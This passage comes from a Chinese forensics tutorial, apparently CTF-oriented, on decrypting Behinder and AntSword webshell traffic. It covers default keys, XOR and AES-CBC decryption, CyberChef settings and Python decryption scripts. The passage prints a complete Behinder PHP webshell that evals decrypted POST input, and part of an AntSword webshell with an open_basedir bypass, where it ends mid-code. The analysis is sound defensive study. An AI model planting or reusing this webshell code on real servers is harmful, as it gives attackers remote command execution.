<a href=#%e5%86%b0%e8%9d%8e%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）</p><p>！！当找不到密钥或者密钥未知的时候可以尝试直接用默认密钥解密试一下！！</p></blockquote><p>或者也可以尝试用<code>PuzzleSolver</code>爆破一下密钥</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250424172707884.png alt=/posts/5422d65/imgs/image-20250424172707884.png height=1114 width=1504></p><p>冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的</p><p>具体的加密代码如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=c1>// $key=&#34;e45e329feb5d925b&#34;; // 默认密钥
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$key</span><span class=o>=</span><span class=s2>&#34;5b4582c9d56b5b33&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$post</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$t</span><span class=o>=</span><span class=s2>&#34;base64_&#34;</span><span class=o>.</span><span class=s2>&#34;decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nv>$t</span><span class=p>(</span><span class=nv>$post</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$post</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    			 <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$key</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>    			<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$post</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$arr</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$post</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$func</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$params</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>C</span><span class=p>{</span><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(</span><span class=nv>$p</span><span class=p>)</span> <span class=p>{</span><span class=k>eval</span><span class=p>(</span><span class=nv>$p</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);}}</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>call_user_func</span><span class=p>(</span><span class=k>new</span> <span class=nx>C</span><span class=p>(),</span><span class=nv>$params</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>大体功能是：POST接收加密数据，随后先进行Base64解码，再判断是否启用OpenSSL扩展，如果启用则使用AES解密，如果没有则使用密钥循环异或解密。Webshell在上传后，会先生成一段代码用于处理执行结果并加密返回给客户端，确保响应流量中的数据也是加密的，随后开始执行攻击者的命令，如果是PHP Webshell，在冰蝎客户端中点开该shell的时候会自动执行一次phpinfo，以上过程在流量中均有体现。</p></blockquote><h4 class=heading-element id=xor_base64><span>XOR_base64</span>
<a href=#xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250419164124175.png alt=/posts/5422d65/imgs/image-20250419164124175.png height=1528 width=2560></p><h4 class=heading-element id=aes_base64><span>AES_base64</span>
<a href=#aes_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>当加密器用的是AES加密的时候就需要注意了</p><p>可能会有两种情况，一种是AES-ECB（没有IV），一种是AES-CBC（有IV）</p><p>如果是 AES-ECB，那直接用填入密钥解密即可，这里我们详细讨论一下 AES-CBC 的情况</p><blockquote><p>这里仅讨论默认PHP Webshell的情况，不同语言或不同Shell情况不同，需分情况对待</p></blockquote><p>冰蝎4.0的默认IV是：<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p><p>首先，需要分析那段PHP Webshell中的一句：<code>$post=openssl_decrypt($post, "AES128", $key);</code></p><p>该Shell通过OpenSSL扩展实现AES加解密，而OpenSSL中的AES128通常默认对应AES-128-CBC，而上文那句话里并没有传入IV参数，所以OpenSSL会把所需的IV处理为默认值，也就是全0（16个\x00）</p><p>如果在WebShell中传了自定义的IV参数，那么解密时需要将该IV填入，比如：<code>0123456789abcdef</code></p><p>照常理来说使用这样默认为16个<code>\x00</code>的IV即可正常解密。但传入16个1也可以正常解出<code>base64_decode()</code>括号内的内容，如下图所示：</p><p><img loading=lazy src=/posts/5422d65/imgs/f4413f003bad201ef52b84974e4a5bdb.png alt=/posts/5422d65/imgs/f4413f003bad201ef52b84974e4a5bdb.png height=920 width=2063></p><p>这要说到AES-CBC的原理：</p><p><img loading=lazy src=/posts/5422d65/imgs/040733479f1ea54a0871282953df365a.png alt=/posts/5422d65/imgs/040733479f1ea54a0871282953df365a.png height=744 width=930></p><p>每一个密文块（16位）解密后都要和前一个密文块按位异或，而第一个密文块前没有密文块，所以需要16位的IV来“充当密文块”，而IV的错误只会影响第一个密文块的内容，后面的密文块能否正常解密只和前一个密文块有关。<code>base64_decode()</code>括号内的内容并不在第一个密文块里，所以看上去变成了“无论什么IV都可以正确解出密文”</p><p>虽然偏移是0（异或0等于没有异或，也就等于没有IV），但依然不能直接使用AES-ECB进行解密，因为相比起ECB，IV是0的CBC从第二个密文块开始依然有异或的过程，所以在Cyberchef里应使用如下参数解密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>AES</span> <span class=n>Decrypt</span> <span class=c1>#仅讨论默认情况</span>
</span></span><span class=line><span class=cl><span class=n>Key</span><span class=p>:</span> <span class=n>e45e329feb5d925b</span> <span class=p>(</span><span class=n>UTF</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>IV</span><span class=err>：</span> \<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span> <span class=p>(</span><span class=n>Hex</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Mode</span><span class=err>：</span><span class=n>CBC</span>
</span></span><span class=line><span class=cl><span class=n>Input</span> <span class=o>/</span> <span class=n>Output</span><span class=err>：</span><span class=n>Raw</span> <span class=p>(</span><span class=n>视情况而定</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行</p><p><img loading=lazy src=/posts/5422d65/imgs/N3.png alt=/posts/5422d65/imgs/N3.png height=971 width=2040></p><p><img loading=lazy src=/posts/5422d65/imgs/N4.png alt=/posts/5422d65/imgs/N4.png height=844 width=2036></p><p>当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用<code>@风二西</code>师傅的<code>承影_哥斯拉冰蝎解码工具</code>辅助解密</p><p>直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可</p><p><img loading=lazy src=/posts/5422d65/imgs/N5.png alt=/posts/5422d65/imgs/N5.png height=1589 width=2551></p><p>最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况</p><p>这里我就放几个比较简单的解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># XOR</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;e45e329feb5d925b&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_xor</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key_stream</span> <span class=o>=</span> <span class=p>(</span><span class=n>key</span><span class=p>[(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>a</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=k>for</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>key_stream</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># AES-CBC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;5b4582c9d56b5b33&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># 默认填充到16字节(AES-128)</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_aes_cbc</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=蚁剑流量分析><span>蚁剑流量分析</span>
<a href=#%e8%9a%81%e5%89%91%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>蚁剑支持多种编码器，然后Github上也有很多<a href=https://goodlunatic.github.io/posts/5422d65/#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90 target=_blank rel="external nofollow noopener noreferrer">开源的编码器</a></p><p>1、 <a href=https://github.com/lowliness9/AntSwordEncoder target=_blank rel="external nofollow noopener noreferrer">https://github.com/lowliness9/AntSwordEncoder</a></p><p>2、 <a href=https://github.com/AntSwordProject/AwesomeEncoder target=_blank rel="external nofollow noopener noreferrer">https://github.com/AntSwordProject/AwesomeEncoder</a></p><p>因此流量的分析和解密上就会稍微复杂一点</p><p>这里我稍微写一下蚁剑流量分析需要注意的地方：</p><blockquote><p>0、首先需要判断出攻击者用的是什么编码器</p><p>1、路径base64字符串需要去除前两个字符后再解码</p><p>2、响应数据的头尾有额外的字符，需要先去除然后再base64解码</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// 蚁剑webshell一个比较简单的例子
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 设置一些PHP配置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span> <span class=c1>// 关闭显示错误信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// 设置脚本执行时间为无限制
</span></span></span><span class=line><span class=cl><span class=c1>// 获取open_basedir配置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$opdir</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 如果open_basedir配置存在
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nv>$opdir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 获取当前脚本所在目录
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$ocwd</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将open_basedir路径分割成数组
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// /;|:/
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$oparr</span> <span class=o>=</span> <span class=nx>preg_split</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Lzt8Oi8=&#34;</span><span class=p>),</span> <span class=nv>$opdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将当前目录和系统临时目录添加到数组中
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>@</span><span class=nx>array_push</span><span class=p>(</span><span class=nv>$oparr</span><span class=p>,</span> <span class=nv>$ocwd</span><span class=p>,</span> <span class=nx>sys_get_temp_dir</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 遍历open_basedir数组
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$oparr</span> <span class=k>as</span> <span class=nv>$item</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 如果目录不可写，继续下一个目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>is_writable</span><span class=p>(</span><span class=nv>$item</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 创建一个临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nv>$item</span> <span class=o>.</span> <span class=s2>&#34;/.573ef8c9dd12&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 如果目录创建失败，继续下一个目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 获取临时目录的真实路径
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nx>realpath</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 切换到临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 修改open_basedir配置，使其可以访问上层目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 获取目录路径的数组
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$cntarr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>preg_split</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\\\</span><span class=s2>|\//&#34;</span><span class=p>,</span> <span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 逐级返回上层目录，以还原open_basedir配置
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$cntarr</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 恢复open_basedir配置为根目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 删除临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>rmdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 跳出循环，只操作第一个可写目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 自定义函数，对输出进行base64编码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>asenc</span><span class=p>(</span><span class=nv>$out</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>@</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
